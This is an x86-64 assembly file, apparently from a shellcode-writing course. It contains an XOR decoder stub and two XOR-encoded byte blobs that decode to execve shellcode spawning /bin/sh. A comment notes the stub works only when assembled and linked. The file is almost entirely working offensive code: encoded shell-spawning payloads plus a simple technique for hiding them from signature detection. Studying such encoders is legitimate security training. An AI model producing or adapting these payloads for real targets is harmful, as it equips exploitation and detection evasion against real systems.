; This one works if assembled and linked, but not if turned into shellcode, since the data section doesn't make it accross


global _start

section .text

_start:

decoder:
    ; pop rdi
    lea rbx, [execve_shellcode]

    xor rcx,rcx
    add cl, 30

decode:
    xor byte [rbx], 0xAA
    inc rbx
    loop decode

    jmp execve_shellcode

section .data
    ; 29-execve.asm shellcode (len 30)
    execve_shellcode: db 0xe2,0x9b,0x6a,0xe2,0x29,0x6a,0x91,0xe2,0x9b,0x71,0xf9,0xe2,0x13,0x85,0xc8,0xc3,0xc4,0x85,0x85,0xd9,0xc2,0xfb,0xe2,0x9b,0x63,0xe2,0x23,0x4d,0xa5,0xaf

    ; 31-execve-jcp.asm shellcode (len 60)
    execve_jcp_shellcode: db 0x41,0xb7,0xe2,0x9b,0x6a,0xf5,0x22,0xcd,0xad,0xe2,0x23,0xd5,0xa2,0xe2,0x23,0xed,0xba,0xe2,0x27,0xdd,0xa2,0xe2,0x27,0xfd,0xba,0xe2,0x29,0x6a,0x91,0xa5,0xaf,0x42,0x74,0x55,0x55,0x55,0x85,0xc8,0xc3,0xc4,0x85,0xd9,0xc2,0xeb,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe8,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9,0xe9